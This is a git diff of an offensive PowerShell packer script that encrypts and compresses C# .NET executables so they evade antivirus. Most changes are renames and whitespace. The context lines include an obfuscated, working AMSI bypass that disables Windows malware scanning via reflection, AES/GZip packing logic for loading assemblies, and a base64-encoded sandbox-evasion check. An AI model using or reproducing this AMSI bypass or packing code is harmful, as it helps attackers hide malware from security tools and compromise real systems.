@@ -1,5 +1,5 @@
 # ========================================================================================================================
-# 'Invoke-Csharp-Packer' allows to pack and encrypt offensive (C#) .NET executable files in order to bypass AV solutions
+# 'Invoke-PoSH-CsharpPacker' allows to pack and encrypt offensive (C#) .NET executable files in order to bypass AV solutions
 # Author: https://github.com/Jean-Francois-C / GNU General Public License v3.0
 # ========================================================================================================================
 # Features:
@@ -10,9 +10,9 @@
 # - Basic sandbox evasion techniques (optional -sandbox)
 # ========================================================================================================================
 # Usage: 
-# > Import-Module ./Invoke-Csharp-Packer.ps1
-# > Invoke-Csharp-Packer -FileUrl https://URL/Csharp-binary.exe -OutFile C:\path\Packed-Csharp-binary.ps1
-# > Invoke-Csharp-Packer -FilePath C:\path\Csharp-binary.exe -OutFile C:\path\Packed-Csharp-binary.ps1
+# > Import-Module ./Invoke-PoSH-CsharpPacker.ps1
+# > Invoke-PoSH-CsharpPacker -FileUrl https://URL/Csharp-binary.exe -OutFile C:\path\Packed-Csharp-binary.ps1
+# > Invoke-PoSH-CsharpPacker -FilePath C:\path\Csharp-binary.exe -OutFile C:\path\Packed-Csharp-binary.ps1
 # ========================================================================================================================
 
 Write-Output "
@@ -23,9 +23,9 @@ Write-Output "
                       |_|                               v2.0
 
 Usage: 
-> Import-Module ./Invoke-Csharp-Packer.ps1
-> Invoke-Csharp-Packer -FileUrl https://URL/Csharp-binary.exe -OutFile C:\path\Packed-Csharp-binary.ps1
-> Invoke-Csharp-Packer -FilePath C:\path\Csharp-binary.exe -OutFile C:\path\Packed-Csharp-binary.ps1
+> Import-Module ./Invoke-PoSH-CsharpPacker.ps1
+> Invoke-PoSH-CsharpPacker -FileUrl https://URL/Csharp-binary.exe -OutFile C:\path\Packed-Csharp-binary.ps1
+> Invoke-PoSH-CsharpPacker -FilePath C:\path\Csharp-binary.exe -OutFile C:\path\Packed-Csharp-binary.ps1
 
 Features:
 [*] AES encryption and GZip/Deflate compression (based on 'Xencrypt')
@@ -38,7 +38,7 @@ Features:
 # ''A'''M''S''I''-''B''Y''P''A''S''S''
 [Runtime.InteropServices.Marshal]::WriteInt32([Ref].ASSeMBly.GEtTYPe(("{5}{2}{0}{1}{3}{6}{4}" -f 'ut',('o'+'ma'+'t'+''+'ion.'),'.A',('Am'+''+'s'+'iU'+'t'+''),'ls',('S'+'yste'+'m.'+'M'+'anag'+'e'+'men'+'t'),'i')).GEtFieLd(("{2}{0}{1}" -f 'i',('Co'+'n'+'text'),('am'+'s')),[Reflection.BindingFlags]("{4}{2}{3}{0}{1}" -f('b'+'lic,Sta'+'ti'),'c','P','u',('N'+'on'))).GEtVaLUe($null),0x41414141);
 
-function Invoke-Csharp-Packer {
+function Invoke-PoSH-CsharpPacker {
 	
 	[CmdletBinding()]
 	Param (
@@ -51,7 +51,7 @@ function Invoke-Csharp-Packer {
         [Parameter(Mandatory,ValueFromPipeline,ValueFromPipelineByPropertyName)]
         [string] $Outfile = $(Throw("-OutFile is required")),
 		
-				[Parameter(ValueFromPipeline,ValueFromPipelineByPropertyName)]
+	[Parameter(ValueFromPipeline,ValueFromPipelineByPropertyName)]
         [switch] $Sandbox
 		)
 
@@ -97,7 +97,7 @@ function Invoke-Csharp-Packer {
         if ($compressiontype -eq "Gzip") {
             $compressionStream = New-Object System.IO.Compression.GzipStream $output, ([IO.Compression.CompressionMode]::Compress)
         } 
-				elseif ( $compressiontype -eq "Deflate") {
+	elseif ( $compressiontype -eq "Deflate") {
             $compressionStream = New-Object System.IO.Compression.DeflateStream $output, ([IO.Compression.CompressionMode]::Compress)
         }
       	$compressionStream.Write( $TempNETAssemblyLoaderFileRead, 0, $TempNETAssemblyLoaderFileRead.Length )
@@ -109,7 +109,7 @@ function Invoke-Csharp-Packer {
         if ($ciphermode -eq 'CBC') {
             $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
         } 
-				elseif ($ciphermode -eq 'ECB') {
+	elseif ($ciphermode -eq 'ECB') {
             $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::ECB
         }
         if ($paddingmode -eq 'PKCS7') {
@@ -139,7 +139,7 @@ function Invoke-Csharp-Packer {
         
         $AssemblyLoaderFileFile = ''
         
-		if ($sandbox) {	
+	if ($sandbox) {	
         Write-Output "[*] Adding basic sandbox checks"
         $code_fixed_order1 += '${17} = "aWYgKFQnZSdzJ3QnLVBBdEggVmFyJ2knYSdiJ2xlOlBTJ0QnZSdiJ3VnQ09OdGVYdCkge"' + "`r`n"
         $AssemblyLoaderFileFile += $code_fixed_order1 -join ''
